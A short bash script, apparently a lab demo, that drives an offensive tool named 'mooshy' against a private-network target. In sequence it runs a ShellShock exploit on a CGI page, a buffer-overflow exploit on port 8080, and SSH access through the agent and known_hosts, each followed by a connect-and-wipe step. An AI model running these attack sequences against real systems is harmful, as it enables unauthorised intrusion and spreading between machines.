#!/usr/bin/env bash

ip=${1:-192.168.56.101}
user=${2:-averagejoe}
mooshy=./bin/mooshy-linux-amd64

cowsay "ShellShock"
${mooshy} -shellShock -addr http://${ip}/cgi-bin/index.cgi
${mooshy} -addr ${ip}:22
${mooshy} -addr ${ip}:22 -wipe 

cowsay "Buffer Overflow"
echo "Now execute 'killall hhttpd; hhttpd'"
${mooshy} -bufferOverflow -addr ${ip}:8080
${mooshy} -addr ${ip}:22
${mooshy} -addr ${ip}:22 -wipe 

cowsay "SSH"
cat ~/.ssh/known_hosts | grep ${ip} > known_hosts
${mooshy} -ssh -useSSHAgent -useSSHKnown -sshKnown known_hosts -sshUser ${user}
${mooshy} -addr ${ip}:22
${mooshy} -addr ${ip}:22 -wipe
